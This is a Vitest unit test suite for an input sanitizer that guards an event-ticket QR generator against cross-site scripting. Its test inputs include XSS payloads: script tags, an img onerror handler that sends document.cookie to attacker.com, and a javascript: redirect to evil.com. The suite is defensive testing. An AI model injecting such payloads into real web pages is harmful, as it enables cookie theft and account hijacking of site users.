/**
 * Unit Test Suite: Input Sanitization & XSS Defense
 * Ticket: ENG-139055 - Ticket QR Code Generator Worker
 *
 * Requirements covered:
 * - Text inputs must be sanitized against XSS before being stored in application state
 * - Clean text, unicode, and legitimate inputs must be preserved
 * - Metadata objects must be recursively sanitized
 */

import { describe, it, expect } from 'vitest';
import { defaultSanitizer, SanitizerService } from '../../src/security/sanitizer';

describe('Unit: Sanitization & XSS Prevention (ENG-139055)', () => {
  const sanitizer: SanitizerService = defaultSanitizer;

  describe('XSS Sanitization of Text Inputs', () => {
    it('should strip raw <script> tags from attendee name', () => {
      const malicious = 'John <script>alert("xss")</script> Doe';
      const clean = sanitizer.sanitizeText(malicious);
      expect(clean).not.toContain('<script>');
      expect(clean).not.toContain('alert');
      expect(clean).toBe('John  Doe');
    });

    it('should neutralize inline event handlers like onerror and onload', () => {
      const malicious = '<img src=x onerror="fetch(`//attacker.com?c=${document.cookie}`)">';
      const clean = sanitizer.sanitizeText(malicious);
      expect(clean).not.toContain('onerror');
      expect(clean).not.toContain('attacker.com');
      expect(clean).not.toContain('<img');
    });

    it('should strip javascript: pseudo-protocol URIs', () => {
      const malicious = 'javascript:void(window.location="http://evil.com")';
      const clean = sanitizer.sanitizeText(malicious);
      expect(clean).not.toContain('javascript:');
      expect(clean).not.toContain('evil.com');
    });

    it('should strip iframe and embedded objects', () => {
      const malicious = '<iframe src="https://phishing.site"></iframe>VIP Attendee';
      const clean = sanitizer.sanitizeText(malicious);
      expect(clean).not.toContain('<iframe');
      expect(clean).not.toContain('phishing.site');
      expect(clean).toContain('VIP Attendee');
    });

    it('should encode residual HTML entities (&, <, >, ", \')', () => {
      const input = 'Alice & Bob <Special "Guest" & \'Speaker\'>';
      const clean = sanitizer.sanitizeText(input);
      expect(clean).not.toContain('<');
      expect(clean).not.toContain('>');
      expect(clean).toContain('&amp;');
      expect(clean).toContain('&quot;');
      expect(clean).toContain('&#x27;');
    });

    it('should preserve valid international unicode names and accented characters', () => {
      const legitimate = 'Renée François-Müller, Jr.';
      const clean = sanitizer.sanitizeText(legitimate);
      expect(clean).toBe('Renée François-Müller, Jr.');
    });

    it('should sanitize nested ticket metadata objects recursively', () => {
      const rawMetadata = {
        badge_title: 'Lead Architect <script>evil()</script>',
        department: 'Engineering',
        notes: {
          dietary: 'Vegetarian <img src=x onerror=alert(1)>',
          allergies: 'None',
        },
      };

      const sanitized = sanitizer.sanitizeObject(rawMetadata);
      expect(sanitized.badge_title).not.toContain('<script>');
      expect(sanitized.notes.dietary).not.toContain('onerror');
      expect(sanitized.department).toBe('Engineering');
      expect(sanitized.notes.allergies).toBe('None');
    });
  });
});
